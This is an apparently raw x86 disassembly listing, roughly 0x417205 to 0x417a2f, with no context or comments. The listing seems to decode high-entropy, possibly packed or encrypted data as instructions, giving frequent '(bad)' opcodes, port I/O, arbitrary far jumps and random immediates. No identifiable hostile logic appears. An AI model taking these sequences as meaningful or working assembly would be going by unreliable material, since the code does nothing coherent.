  417205:	fnstenv [edi+0x33]
  417208:	mov    eax,0x87bdd63c
  41720d:	pop    es
  41720e:	(bad)  
  41720f:	jns    0x417225
  417211:	mov    edx,0x5f001b69
  417216:	or     ch,dl
  417218:	ret    
  417219:	pop    esi
  41721a:	adc    dx,WORD PTR [ebx-0x10]
  41721e:	mov    esi,0xdd66a0ae
  417223:	jno    0x41729c
  417225:	in     al,dx
  417226:	jecxz  0x41721f
  417228:	ins    DWORD PTR es:[edi],dx
  417229:	cmp    DWORD PTR [ecx+0x39],ecx
  41722c:	add    bl,0xa4
  41722f:	dec    esp
  417230:	int    0x7f
  417232:	inc    BYTE PTR [ecx+0x3f]
  417235:	sub    BYTE PTR [edx],dl
  417237:	shl    BYTE PTR [esi],1
  417239:	dec    edx
  41723a:	enter  0x6a16,0x78
  41723e:	pop    ss
  41723f:	mov    dl,0x4d
  417241:	push   ss
  417242:	jbe    0x41723a
  417244:	add    dh,BYTE PTR [ebp-0x6562e3e6]
  41724a:	cmp    BYTE PTR [ebx],al
  41724c:	clc    
  41724d:	arpl   WORD PTR ds:0xa62783ee,bp
  417253:	retf   
  417254:	sbb    eax,0x4bddefc6
  417259:	mov    edx,0x8e0a725d
  41725e:	pop    ds
  41725f:	out    dx,al
  417260:	cld    
  417261:	ja     0x4171e7
  417263:	test   eax,0xcad0070d
  417268:	mov    eax,0xc79459d1
  41726d:	jp     0x417223
  41726f:	pop    esi
  417270:	(bad)  
  417272:	xchg   esp,eax
  417273:	adc    eax,esi
  417275:	pop    eax
  417276:	enter  0x130e,0xa
  41727a:	inc    ebx
  41727b:	fsubr  st,st(2)
  41727d:	bound  ebx,QWORD PTR [esi+0x7b]
  417280:	leave  
  417281:	scas   al,BYTE PTR es:[edi]
  417282:	cmp    ah,BYTE PTR [edi]
  417284:	inc    edi
  417285:	adc    edx,ebx
  417287:	sub    eax,0xd28a2e7b
  41728c:	fld    QWORD PTR [ecx+esi*2]
  41728f:	sbb    DWORD PTR [edi+esi*8+0x42204826],0xffffff9a
  417297:	pop    ebp
  417298:	ins    DWORD PTR es:[edi],dx
  417299:	cmp    ebx,eax
  41729b:	mov    ebx,0x37f6ed7f
  4172a0:	in     eax,dx
  4172a1:	test   DWORD PTR [edi+0x3e85b648],ebp
  4172a7:	jns    0x41727f
  4172a9:	adc    eax,0x2de1bbd4
  4172ae:	int    0xd5
  4172b0:	data16 ficomp DWORD PTR [ebp+0xdb6dddc]
  4172b7:	fs mov ebx,0x1204307d
  4172bd:	fisub  WORD PTR [edi+0x4d]
  4172c0:	adc    al,0x77
  4172c2:	je     0x417324
  4172c4:	sub    DWORD PTR [edx-0x3b],0x77
  4172c8:	aas    
  4172c9:	xchg   ecx,eax
  4172ca:	stos   BYTE PTR es:[edi],al
  4172cb:	std    
  4172cc:	cdq    
  4172cd:	fimul  WORD PTR [edx-0x71]
  4172d0:	in     al,0x9c
  4172d2:	mov    dl,BYTE PTR [ebx]
  4172d4:	pop    ecx
  4172d5:	lea    esi,ds:0xa5d70023
  4172db:	cli    
  4172dc:	inc    edx
  4172dd:	daa    
  4172de:	inc    ecx
  4172df:	xor    BYTE PTR [ecx+ebp*8+0x50],0x44
  4172e4:	add    ah,BYTE PTR [ebp+0x46015911]
  4172ea:	mov    edx,0xb0ba1867
  4172ef:	cmp    BYTE PTR [esi+0x43e15ba1],0x66
  4172f6:	shl    BYTE PTR [edx-0x5f],1
  4172f9:	inc    esi
  4172fa:	pop    ds
  4172fb:	pop    es
  4172fc:	cmc    
  4172fd:	jb     0x417360
  4172ff:	mov    al,0xdb
  417301:	push   ss
  417302:	inc    ebp
  417303:	jl     0x417347
  417305:	pop    ebp
  417306:	push   edi
  417307:	addr16 retw 0x205a
  41730c:	aaa    
  41730d:	pop    ecx
  41730e:	sbb    esp,DWORD PTR [edi-0xd]
  417311:	sbb    ebx,DWORD PTR [eax-0x46]
  417314:	rcl    BYTE PTR [ebx],0x2e
  417317:	push   ds
  417318:	mov    edx,0x3aa2dd35
  41731d:	xor    al,0x8a
  41731f:	jp     0x4172fd
  417321:	xchg   edx,eax
  417322:	cdq    
  417323:	and    cl,BYTE PTR [ecx]
  417325:	fs jmp 0x923e:0xba104c94
  41732d:	aas    
  41732e:	or     BYTE PTR [ebx-0x2],ah
  417331:	fwait
  417332:	stos   DWORD PTR es:[edi],eax
  417333:	sbb    DWORD PTR [edi+0x8],esp
  417336:	sbb    al,0x3
  417338:	push   edi
  417339:	div    DWORD PTR [esi+0x66]
  41733c:	sahf   
  41733d:	out    0x6,eax
  41733f:	and    al,0x5e
  417341:	cmp    ecx,ebp
  417343:	sub    ah,BYTE PTR [esi-0x59ef9881]
  417349:	(bad)  
  41734a:	lds    ecx,FWORD PTR [edx+eiz*4-0x327a81e8]
  417351:	jge    0x4173b5
  417353:	or     BYTE PTR [ebx-0x7a],bh
  417356:	addr16 mov ecx,0x6ba57214
  41735c:	xchg   esp,eax
  41735d:	mov    al,ds:0xb0dfae92
  417362:	sub    ecx,DWORD PTR [eax-0x7]
  417365:	int3   
  417366:	imul   ecx,edx,0xffffffac
  417369:	or     BYTE PTR [ebx+edx*2+0x5d],0x9
  41736e:	push   ss
  41736f:	ja     0x417323
  417371:	shl    DWORD PTR ds:0x1db23ccd,cl
  417377:	xchg   esp,eax
  417378:	xor    DWORD PTR [edx+0x33],edx
  41737b:	mov    esp,DWORD PTR [eax-0x6d]
  41737e:	pop    esi
  41737f:	in     eax,dx
  417380:	addr16 inc ebx
  417382:	data16 (bad) 
  417384:	xchg   esi,eax
  417385:	mov    ch,0x78
  417387:	jae    0x4173e5
  417389:	jno    0x4173e4
  41738b:	or     ebp,DWORD PTR [edx-0x7a3a0537]
  417391:	jb     0x417370
  417393:	mov    al,0x8b
  417395:	clc    
  417396:	jo     0x417383
  417398:	xchg   edx,eax
  417399:	pop    eax
  41739a:	inc    ecx
  41739b:	sub    edx,ecx
  41739d:	sub    BYTE PTR [ebp+0x68],cl
  4173a0:	sbb    BYTE PTR [ecx-0x3c],dl
  4173a3:	jae    0x4173a3
  4173a5:	jo     0x417382
  4173a7:	adc    ebx,DWORD PTR [ecx+0x71]
  4173aa:	cmc    
  4173ab:	pushf  
  4173ac:	test   eax,0x2469b70d
  4173b1:	mov    eax,ds:0x5a762d46
  4173b6:	setne  BYTE PTR [edi+edi*8]
  4173ba:	out    dx,al
  4173bb:	or     cl,ah
  4173bd:	dec    esp
  4173be:	(bad)  
  4173c0:	push   ds
  4173c1:	rcl    BYTE PTR [eax],cl
  4173c3:	cmp    al,0x54
  4173c5:	in     eax,dx
  4173c6:	lds    ecx,FWORD PTR [edx]
  4173c8:	call   0x559e:0x14efe5b4
  4173cf:	ins    BYTE PTR es:[edi],dx
  4173d0:	mov    dh,0x78
  4173d2:	inc    edi
  4173d3:	cmp    al,0x82
  4173d5:	and    ch,BYTE PTR [ecx]
  4173d7:	push   0x585ebf61
  4173dc:	popa   
  4173dd:	adc    BYTE PTR ds:0x309fd827,ah
  4173e3:	xchg   ecx,eax
  4173e4:	nop
  4173e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173e6:	xor    BYTE PTR ds:0x983dd29e,dl
  4173ec:	(bad)  
  4173ed:	(bad)  
  4173ee:	ds push ecx
  4173f0:	jne    0x417429
  4173f2:	stos   DWORD PTR es:[edi],eax
  4173f3:	scas   al,BYTE PTR es:[edi]
  4173f4:	sub    eax,0x11db2f47
  4173f9:	push   ebx
  4173fa:	push   ds
  4173fb:	cmc    
  4173fc:	xchg   DWORD PTR ds:0x43542090,ecx
  417402:	pop    ebx
  417403:	push   ss
  417404:	xchg   esi,eax
  417405:	sahf   
  417406:	mov    ebx,DWORD PTR [eax]
  417408:	mov    ebx,0xc70c5741
  41740d:	inc    ebx
  41740e:	pop    es
  41740f:	sbb    BYTE PTR [edx+0x21],al
  417412:	sub    al,0xd4
  417414:	mov    esi,0xf04a7e6
  417419:	imul   eax,DWORD PTR [edi+0x26],0xfffffff9
  41741d:	xchg   ecx,eax
  41741e:	rol    DWORD PTR [esi-0x171235c2],1
  417424:	push   0x44
  417426:	(bad)  
  417427:	pop    esi
  417428:	mov    esp,0xd0054202
  41742d:	inc    esp
  41742e:	jnp    0x41745d
  417430:	scas   al,BYTE PTR es:[edi]
  417431:	mov    eax,0xcf241983
  417436:	mov    bh,0x27
  417438:	ret    0xf382
  41743b:	sahf   
  41743c:	mov    eax,0x93fadc54
  417441:	scas   al,BYTE PTR es:[edi]
  417442:	inc    DWORD PTR [ebx]
  417444:	sbb    ecx,0x7e
  417447:	xor    al,dh
  417449:	mov    ch,0x0
  41744b:	dec    ebx
  41744c:	lahf   
  41744d:	(bad)  
  41744e:	cmp    eax,0xc63f42d8
  417453:	test   DWORD PTR [edi+0x2a4699bf],edi
  417459:	fisttp DWORD PTR [ecx+0x23c20980]
  41745f:	hlt    
  417460:	lods   al,BYTE PTR ds:[esi]
  417461:	jecxz  0x417438
  417463:	shl    BYTE PTR [ebx-0x14],1
  417466:	add    ch,BYTE PTR [ebx]
  417468:	pop    ss
  417469:	xchg   ebx,eax
  41746a:	lahf   
  41746b:	fsub   st(4),st
  41746d:	outs   dx,BYTE PTR ds:[esi]
  41746e:	jmp    0x8e82:0x6eccd000
  417475:	adc    al,0x46
  417477:	adc    DWORD PTR [esi],ebp
  417479:	pusha  
  41747a:	or     BYTE PTR gs:[edi+0x5614ca77],bl
  417481:	mov    ebx,0xce028d1e
  417486:	xchg   ebx,eax
  417487:	adc    ecx,esp
  417489:	and    dh,al
  41748b:	das    
  41748c:	lock add BYTE PTR [eax],al
  41748f:	add    BYTE PTR [eax],al
  417491:	add    bh,bl
  417493:	dec    ebp
  417494:	call   0x305f:0xdfdf9a89
  41749b:	adc    al,0x61
  41749d:	retf   0xb590
  4174a0:	outs   dx,DWORD PTR ds:[esi]
  4174a1:	pop    es
  4174a2:	sub    esi,edx
  4174a4:	add    BYTE PTR [eax],al
  4174a6:	repz add al,0x0
  4174a9:	add    BYTE PTR [edi*4+0x4f04066],ch
  4174b0:	iret   
  4174b1:	adc    DWORD PTR [ecx-0x4ef90db8],eax
  4174b7:	in     eax,0x10
  4174b9:	or     BYTE PTR [ebp+0x1cf75dd6],bl
  4174bf:	or     BYTE PTR ds:0x3578ec7d,ch
  4174c5:	mov    edi,0x4d7e1195
  4174ca:	mov    edi,0x3e1171b4
  4174cf:	jge    0x417469
  4174d1:	sbb    BYTE PTR [eax+eiz*8-0x2875723a],bh
  4174d8:	test   al,0x8
  4174da:	dec    ebp
  4174db:	lods   al,BYTE PTR ds:[esi]
  4174dc:	jne    0x417474
  4174de:	mov    dl,0xdd
  4174e0:	sti    
  4174e1:	mov    ds:0xdff46614,al
  4174e6:	test   eax,0x1d4efdbe
  4174eb:	loope  0x4174fb
  4174ed:	add    ebx,ebp
  4174ef:	mov    bh,0x2a
  4174f1:	aam    0x8c
  4174f3:	lds    edi,FWORD PTR [ebp+0xef08a4d]
  4174f9:	bound  edx,QWORD PTR [ecx+ebx*1]
  4174fc:	push   DWORD PTR [edx+0x4f]
  4174ff:	sub    eax,0x78d2396b
  417504:	inc    edi
  417505:	mov    al,ds:0x8bdb5597
  41750a:	popa   
  41750b:	mov    ah,0xb9
  41750d:	pop    ebx
  41750e:	and    BYTE PTR [edx+0x1056eab8],bl
  417514:	aas    
  417515:	scas   al,BYTE PTR es:[edi]
  417516:	adc    eax,0xa425a6fa
  41751b:	int3   
  41751c:	mov    ebp,0x4c0b1b72
  417521:	test   DWORD PTR [eax+edi*2+0x5820e5a2],esp
  417528:	sbb    al,0x31
  41752a:	xor    al,0x8d
  41752c:	loop   0x4174c6
  41752e:	ins    BYTE PTR es:[edi],dx
  41752f:	cmp    bl,BYTE PTR [ebx]
  417531:	dec    eax
  417532:	(bad)  
  417533:	sahf   
  417534:	mov    BYTE PTR [ebx],ah
  417536:	xchg   ebp,eax
  417537:	add    eax,0x339be9b7
  41753c:	or     DWORD PTR [esi-0x5a],0xdd5409c2
  417543:	sti    
  417544:	dec    edi
  417545:	arpl   WORD PTR [edi-0x5d505229],ax
  41754b:	dec    ebx
  41754c:	mov    esi,0x1c7005b9
  417551:	lods   al,BYTE PTR ds:[esi]
  417552:	sti    
  417553:	iret   
  417554:	and    ah,BYTE PTR [edi-0xa]
  417557:	dec    edx
  417558:	jne    0x417518
  41755a:	mov    ebp,0x184fbad6
  41755f:	adc    dh,0x86
  417562:	inc    ebx
  417563:	or     eax,0xd6b2c0f6
  417568:	mov    eax,ds:0x18ed7c1
  41756d:	push   esi
  41756e:	sahf   
  41756f:	fwait
  417570:	lock mov al,BYTE PTR [esi+0x27]
  417574:	aam    0x89
  417576:	cld    
  417577:	push   ebx
  417578:	adc    bh,BYTE PTR [esi+0x68]
  41757b:	ja     0x417541
  41757d:	push   ebp
  41757e:	mov    bh,0x5e
  417580:	xchg   ebp,eax
  417581:	addr16 push ebp
  417583:	repz and BYTE PTR [edx-0x3fe2d180],bl
  41758a:	adc    eax,0xc6f0ff1b
  41758f:	adc    esi,DWORD PTR [eax+0x6ae49ec1]
  417595:	or     ch,BYTE PTR [eax+0x7a14744d]
  41759b:	dec    edi
  41759c:	daa    
  41759d:	xchg   esi,eax
  41759e:	mov    esi,0xd7ebf3d1
  4175a3:	mov    eax,ds:0x3bbb2b6f
  4175a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175a9:	enter  0x94dc,0x74
  4175ad:	mov    ebx,0xb257e789
  4175b2:	or     al,0xc3
  4175b4:	mov    edi,0x935359f3
  4175b9:	nop
  4175ba:	xor    eax,0x603dc13a
  4175c0:	loopne 0x41756a
  4175c2:	ja     0x4175e3
  4175c4:	xchg   edx,eax
  4175c5:	in     al,0xd8
  4175c7:	pop    ds
  4175c8:	in     al,dx
  4175c9:	(bad)  
  4175ca:	sub    DWORD PTR [edi+0x6f],ebp
  4175cd:	out    dx,eax
  4175ce:	iret   
  4175cf:	dec    esp
  4175d0:	dec    esp
  4175d1:	mov    esp,0x2bca9331
  4175d6:	sub    al,BYTE PTR [edx+eiz*2-0x1e505042]
  4175dd:	and    esi,edx
  4175df:	xor    cl,dh
  4175e1:	or     al,0x25
  4175e3:	outs   dx,DWORD PTR ds:[esi]
  4175e4:	add    ebp,eax
  4175e6:	gs das 
  4175e8:	cdq    
  4175e9:	or     BYTE PTR [esi],al
  4175eb:	sbb    BYTE PTR [ecx+0x1d43ac5b],ch
  4175f1:	fdivp  st(5),st
  4175f3:	arpl   WORD PTR [edx+0x68],ax
  4175f6:	pop    ebx
  4175f7:	mov    cs,esi
  4175f9:	and    DWORD PTR [edi+0x1f421692],edi
  4175ff:	pop    esi
  417600:	pop    edx
  417601:	sub    DWORD PTR [ebx-0x122f7e85],esi
  417607:	int3   
  417608:	push   edx
  417609:	and    eax,0xeff5a386
  41760e:	sub    eax,0xe46b7511
  417613:	stos   BYTE PTR es:[edi],al
  417614:	int    0x15
  417616:	push   ds
  417617:	mov    edx,0xe09d4ec1
  41761c:	xor    BYTE PTR [ebp+0x61],al
  41761f:	pop    ss
  417620:	loop   0x417642
  417622:	xor    eax,0xac62b2ad
  417627:	and    al,0x98
  417629:	gs sub eax,0x2420a789
  41762f:	mov    ss,WORD PTR [edx-0x72]
  417632:	aam    0xc7
  417634:	shl    DWORD PTR [ecx],1
  417636:	or     BYTE PTR [edx],bh
  417638:	pop    ebx
  417639:	dec    ebp
  41763a:	cmp    ecx,edi
  41763c:	enter  0x9ca5,0x6a
  417640:	rol    ah,1
  417642:	addr16 mov edi,0xcd8ba04b
  417648:	cmp    al,0xf7
  41764a:	jmp    FWORD PTR ds:0x276f5b96
  417650:	in     eax,0x4d
  417652:	sar    DWORD PTR [edx+0x7547449],cl
  417658:	mov    ds:0xc828ff03,eax
  41765d:	sbb    al,0xac
  41765f:	dec    edi
  417660:	sbb    DWORD PTR [eax+ecx*4+0x49],edx
  417664:	stc    
  417665:	xor    BYTE PTR [esi+ebx*8],0x2
  417669:	mov    ah,0xb4
  41766b:	mov    es,eax
  41766d:	xchg   edi,eax
  41766e:	mov    ebx,0x2521f6d3
  417673:	dec    ecx
  417674:	loopne 0x41761d
  417676:	adc    esi,DWORD PTR [edx]
  417678:	dec    ecx
  417679:	inc    ecx
  41767a:	aas    
  41767b:	add    dh,BYTE PTR ds:0x99e75e50
  417681:	sub    al,0x1e
  417683:	sbb    BYTE PTR [eax+0x4aeff660],cl
  417689:	shl    dl,1
  41768b:	and    dl,BYTE PTR [ecx+0xf0ad29f]
  417691:	lods   al,BYTE PTR ds:[esi]
  417692:	cmp    eax,0x17db7e
  417697:	pop    edx
  417698:	sahf   
  417699:	pushf  
  41769a:	imul   DWORD PTR [edx-0x2e3f74c]
  4176a0:	jno    0x4176fc
  4176a2:	adc    BYTE PTR [edx-0x72],ah
  4176a5:	jle    0x41770e
  4176a7:	outs   dx,DWORD PTR ds:[esi]
  4176a8:	xchg   ebx,eax
  4176a9:	xchg   ebp,eax
  4176aa:	jns    0x41768e
  4176ac:	jo     0x4176bb
  4176ae:	fild   WORD PTR [ecx]
  4176b0:	ret    0xec04
  4176b3:	std    
  4176b4:	inc    ecx
  4176b5:	dec    ebp
  4176b6:	sbb    BYTE PTR [edi],cl
  4176b8:	mov    bh,0xe3
  4176ba:	jl     0x417736
  4176bc:	ja     0x41766d
  4176be:	in     eax,0xd9
  4176c0:	add    ah,BYTE PTR [eax+ecx*1-0x7a93a86b]
  4176c7:	mov    dh,0xb3
  4176c9:	das    
  4176ca:	xor    ah,BYTE PTR [edi]
  4176cc:	cmp    ebp,ebp
  4176ce:	cmc    
  4176cf:	fisubr DWORD PTR [ebp+0xf]
  4176d2:	out    0x30,eax
  4176d4:	cld    
  4176d5:	mov    ah,BYTE PTR [ebx-0x2f339378]
  4176db:	scas   al,BYTE PTR es:[edi]
  4176dc:	pop    edi
  4176dd:	cmp    al,0xeb
  4176df:	add    BYTE PTR [ecx+ebp*2+0x72],0xdb
  4176e4:	loope  0x4176f5
  4176e6:	or     al,0x15
  4176e8:	push   0xe9912842
  4176ed:	loop   0x41770d
  4176ef:	push   ss
  4176f0:	cdq    
  4176f1:	and    DWORD PTR [edi],esi
  4176f3:	int    0x83
  4176f5:	js     0x417730
  4176f7:	jae    0x417698
  4176f9:	icebp  
  4176fa:	repz popf 
  4176fc:	sub    eax,0xdcfc96eb
  417701:	push   esp
  417702:	jb     0x41769e
  417704:	mov    ebp,0x68d19fb3
  417709:	div    BYTE PTR ds:[edi-0x44cacfd8]
  417710:	(bad)  
  417711:	loop   0x4176c1
  417713:	ds out 0xb0,eax
  417716:	push   ds
  417717:	dec    ebx
  417718:	jns    0x41771e
  41771a:	push   es
  41771b:	jg     0x41776e
  41771d:	jecxz  0x4176b1
  41771f:	test   DWORD PTR [esi-0x32],0x9940c054
  417726:	and    eax,0xd746e75c
  41772b:	lods   al,BYTE PTR ds:[esi]
  41772c:	xchg   esp,eax
  41772d:	inc    edi
  41772e:	and    al,0x9a
  417730:	xlat   BYTE PTR ds:[ebx]
  417731:	xchg   ecx,eax
  417732:	xlat   BYTE PTR ds:[ebx]
  417733:	cwde   
  417734:	call   0x1e3c:0xd455d4f1
  41773b:	dec    eax
  41773c:	add    DWORD PTR ds:0x80e756ad,ebp
  417742:	pushf  
  417743:	sub    BYTE PTR [esi+edx*8-0x3da6644],al
  41774a:	bound  edi,QWORD PTR [edi+0x2b]
  41774d:	push   ebx
  41774e:	iret   
  41774f:	iret   
  417750:	pop    ss
  417751:	inc    edx
  417752:	ret    0xe53b
  417755:	sbb    edi,DWORD PTR [ecx]
  417757:	inc    esi
  417758:	or     BYTE PTR [edx-0x573ca76],0x2f
  41775f:	xchg   esi,eax
  417760:	in     eax,0x8a
  417762:	or     ecx,DWORD PTR [ebx]
  417764:	repnz retf 0xde6b
  417768:	push   eax
  417769:	cwde   
  41776a:	adc    ah,BYTE PTR [ebx]
  41776c:	sub    BYTE PTR gs:[eax+0x2e4fc72d],dl
  417773:	mov    esi,0x9bdc0d6f
  417778:	jle    0x4177c3
  41777a:	xchg   DWORD PTR [ecx-0x77],edi
  41777d:	adc    DWORD PTR [ecx+0x5743e04e],ebp
  417783:	add    DWORD PTR [eax+ebp*2+0x2cc24bab],esi
  41778a:	cmp    DWORD PTR [ecx+0x68da446],edi
  417790:	dec    esp
  417791:	sbb    cl,0xe0
  417794:	dec    ebp
  417795:	fcomp  DWORD PTR [edx]
  417797:	jp     0x417811
  417799:	int    0x2f
  41779b:	cli    
  41779c:	mov    ecx,0xf360cbcb
  4177a1:	pop    ds
  4177a2:	fsub   QWORD PTR [eax-0x1f]
  4177a5:	(bad)  
  4177a7:	ds and al,0x13
  4177aa:	cmp    eax,0x25e13c77
  4177af:	gs ret 0xd972
  4177b3:	pop    ecx
  4177b4:	inc    DWORD PTR [ecx+ebx*1]
  4177b7:	and    eax,0x5a35d02b
  4177bc:	test   al,0x3e
  4177be:	adc    ch,bh
  4177c0:	mov    bl,0xef
  4177c2:	xchg   ebx,eax
  4177c3:	adc    esi,DWORD PTR [eax]
  4177c5:	inc    ebx
  4177c6:	inc    esp
  4177c7:	imul   ebx,ebp,0xffffff81
  4177ca:	and    al,BYTE PTR [esi]
  4177cc:	outs   dx,BYTE PTR ds:[esi]
  4177cd:	mov    ds:0x80808ff1,al
  4177d2:	bound  esp,QWORD PTR [esi]
  4177d4:	lahf   
  4177d5:	outs   dx,BYTE PTR ds:[esi]
  4177d6:	(bad)  
  4177d7:	sysexit 
  4177d9:	jae    0x4177e0
  4177db:	ret    0xba4
  4177de:	call   0x7a5a2cfa
  4177e3:	pusha  
  4177e4:	cmp    BYTE PTR [eax*4+0x5c974498],ah
  4177eb:	cld    
  4177ec:	mov    ds:0x30e51dfa,al
  4177f1:	(bad)  
  4177f2:	ficom  DWORD PTR ss:[edi+0x6c]
  4177f6:	out    dx,al
  4177f7:	das    
  4177f8:	fwait
  4177f9:	out    0x20,al
  4177fb:	inc    eax
  4177fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177fd:	mov    eax,ds:0x7b908fe6
  417802:	imul   esi,esi,0x16
  417805:	adc    eax,0x6d90b2bc
  41780a:	or     edi,0x4d
  41780d:	mov    esp,0xf377b545
  417812:	adc    al,0xc7
  417814:	push   ds
  417815:	push   eax
  417816:	test   DWORD PTR [ebx-0x6acfadd],esi
  41781c:	loope  0x4177cd
  41781e:	imul   ebp,DWORD PTR [eax+0x3b],0x29a2e82d
  417825:	je     0x4177aa
  417827:	mov    dh,0x80
  417829:	clc    
  41782a:	xchg   edi,eax
  41782b:	mov    edi,0x72982ae2
  417830:	inc    ebx
  417831:	mov    ch,0xd6
  417833:	addr16 add al,0x88
  417836:	xor    BYTE PTR [eax+0x4204aee3],bl
  41783c:	mov    eax,ds:0x70f18ac4
  417841:	scas   eax,DWORD PTR es:[edi]
  417842:	mov    al,ds:0xad9acea9
  417847:	in     al,dx
  417848:	shr    BYTE PTR [esi+edi*8+0x24],cl
  41784c:	cmp    esp,DWORD PTR [edi+0x4c]
  41784f:	xchg   edi,eax
  417850:	leave  
  417851:	jmp    0x883707d
  417856:	movups xmm2,XMMWORD PTR [esi+0x39067924]
  41785d:	in     al,dx
  41785e:	sbb    eax,0x5d5ac9cf
  417863:	cwde   
  417864:	sbb    eax,0x6206f1fd
  417869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41786a:	add    eax,0xf6ac7a2e
  41786f:	mov    edi,0xd5d4a200
  417874:	and    esi,DWORD PTR [ecx-0xc0b28be]
  41787a:	or     al,0x54
  41787c:	pop    ecx
  41787d:	test   ebp,esp
  41787f:	and    al,0xe
  417881:	stc    
  417882:	jnp    0x417828
  417884:	rcl    DWORD PTR [esi+edx*1],cl
  417887:	xor    eax,0x3109764f
  41788c:	mov    DWORD PTR [eax-0x63],eax
  41788f:	xchg   ebp,eax
  417890:	ss pop ecx
  417892:	inc    esi
  417893:	loope  0x417896
  417895:	gs mov ebp,0xbf5f3798
  41789b:	mov    cl,0x73
  41789d:	inc    ebx
  41789e:	cmp    eax,0x79bedb49
  4178a3:	and    edx,DWORD PTR [eax+0x9521b49]
  4178a9:	push   edx
  4178aa:	popa   
  4178ab:	mov    ecx,0x50c5d8e1
  4178b0:	ja     0x4178ad
  4178b2:	ds jecxz 0x4178eb
  4178b5:	inc    ecx
  4178b6:	push   es
  4178b7:	pop    edx
  4178b8:	mov    dl,0x34
  4178ba:	push   ecx
  4178bb:	push   ss
  4178bc:	call   0xadfb:0xe5bdd9a7
  4178c3:	xor    BYTE PTR ds:[eax-0x2c02d6a1],bl
  4178ca:	scas   eax,DWORD PTR es:[edi]
  4178cb:	test   al,0xe9
  4178cd:	adc    ebp,DWORD PTR [edx]
  4178cf:	pop    ebx
  4178d0:	loop   0x417901
  4178d2:	cmp    eax,0x36a1da62
  4178d7:	add    eax,0x8fe47da4
  4178dc:	or     eax,0xbd71cfa2
  4178e1:	jge    0x4178c3
  4178e3:	add    DWORD PTR [ebp+0x627bf0b4],esi
  4178e9:	pop    edx
  4178ea:	push   es
  4178eb:	dec    ebp
  4178ec:	sub    cl,BYTE PTR [edi-0x302bfa78]
  4178f2:	xor    eax,0xa8115da5
  4178f7:	loopne 0x417950
  4178f9:	jno    0x4178f0
  4178fb:	(bad)  
  4178fc:	push   ss
  4178fd:	adc    DWORD PTR [edx],0x13c15346
  417903:	sbb    eax,0xa3b16f3e
  417908:	mov    bl,0xbe
  41790a:	xor    ecx,DWORD PTR ss:[ecx]
  41790d:	xor    ebx,ebx
  41790f:	fstp   DWORD PTR [edi+0x5a]
  417912:	cmp    eax,edx
  417914:	inc    esp
  417915:	mov    cl,0xc7
  417917:	push   0x9043c90b
  41791c:	ja     0x41797f
  41791e:	sahf   
  41791f:	push   ds
  417920:	or     esi,0xffffff8f
  417923:	sub    BYTE PTR [ebp+0xe],bh
  417926:	fcomp  QWORD PTR [ecx-0x50883b9a]
  41792d:	out    dx,eax
  41792e:	cdq    
  41792f:	dec    ebp
  417930:	push   ds
  417931:	jg     0x4178ef
  417933:	mov    esi,0x872ffe43
  417938:	mov    WORD PTR [eax+esi*2-0x55a71e54],?
  41793f:	repz and al,0x50
  417942:	cmp    al,0x41
  417944:	jmp    0x77ba:0x920ff89c
  41794b:	ja     0x4179bf
  41794d:	adc    BYTE PTR ds:0xd94136cd,ah
  417953:	sbb    BYTE PTR [edx],bl
  417955:	mov    esi,0xe44088c2
  41795a:	es stos DWORD PTR es:[edi],eax
  41795c:	neg    DWORD PTR [edi+ebp*1-0x21]
  417960:	and    al,0x4c
  417962:	pop    ds
  417963:	cli    
  417964:	pop    eax
  417965:	mov    edx,0x351a18cd
  41796a:	mov    ebx,0x904a6edd
  41796f:	pop    ds
  417970:	xlat   BYTE PTR ds:[ebx]
  417971:	test   ecx,0x162cfe32
  417977:	push   edi
  417978:	sti    
  417979:	dec    ebx
  41797a:	xchg   ah,ch
  41797c:	and    dl,BYTE PTR [edx-0x58]
  41797f:	sub    BYTE PTR [edx],dl
  417981:	sbb    BYTE PTR [edi+0x68f06ff3],cl
  417987:	mov    BYTE PTR ss:[edi+eiz*1-0x421b7dcd],al
  41798f:	or     DWORD PTR [ebp-0x5740f37e],esi
  417995:	int3   
  417996:	xchg   ecx,eax
  417997:	xchg   DWORD PTR [edx+0x41],esi
  41799a:	push   ecx
  41799b:	inc    esi
  41799c:	inc    ebx
  41799d:	add    BYTE PTR [eax],al
  41799f:	add    BYTE PTR [eax],al
  4179a1:	add    BYTE PTR [esi],ah
  4179a3:	mov    ah,0x71
  4179a5:	jno    0x41799a
  4179a7:	cmc    
  4179a8:	div    DWORD PTR es:[edx+0x8]
  4179ac:	mov    eax,ds:0x8e793e75
  4179b1:	pushw  ds
  4179b3:	test   DWORD PTR [eax],0x4f300
  4179b9:	add    BYTE PTR [eax],dh
  4179bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179bc:	(bad)  
  4179bd:	xchg   esi,eax
  4179be:	mov    bl,0xb8
  4179c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179c1:	(bad)  
  4179c2:	mov    esp,0x65e81d39
  4179c7:	ficom  WORD PTR [edx-0x3af7c461]
  4179cd:	pop    eax
  4179ce:	pop    ebx
  4179cf:	dec    ebx
  4179d0:	cdq    
  4179d1:	outs   dx,BYTE PTR gs:[esi]
  4179d3:	test   BYTE PTR [ecx-0x50f4b1ff],cl
  4179d9:	stos   BYTE PTR es:[edi],al
  4179da:	cmp    al,0x3
  4179dc:	jne    0x417a56
  4179de:	add    eax,0x491715c6
  4179e3:	push   eax
  4179e4:	(bad)  
  4179e5:	mov    edi,0x779a1e27
  4179ea:	fldcw  WORD PTR [ebx-0x4c03aa06]
  4179f0:	sbb    esi,DWORD PTR [edx+0x377bcc45]
  4179f6:	mov    esp,0x2d92028a
  4179fb:	test   eax,0xb43e3d13
  417a00:	pop    ss
  417a01:	ret    0xfee9
  417a04:	and    BYTE PTR [edi-0x12520e1],bh
  417a0a:	add    al,0xc2
  417a0c:	inc    ebx
  417a0d:	mov    dx,0x7cf0
  417a11:	jmp    FWORD PTR [eax]
  417a13:	mov    ch,0x27
  417a15:	mov    cl,0x35
  417a17:	sbb    BYTE PTR [edx+0x720c82cf],dl
  417a1d:	mov    eax,0xd02496a9
  417a22:	popf   
  417a23:	lock in al,dx
  417a25:	push   ecx
  417a26:	nop
  417a27:	xchg   esp,eax
  417a28:	push   ds
  417a29:	(bad)  
  417a2a:	and    ch,BYTE PTR [ecx]
  417a2c:	gs sti 
  417a2e:	dec    eax
  417a2f:	cmp    BYTE PTR [ecx+0x4d52cc9e],cl
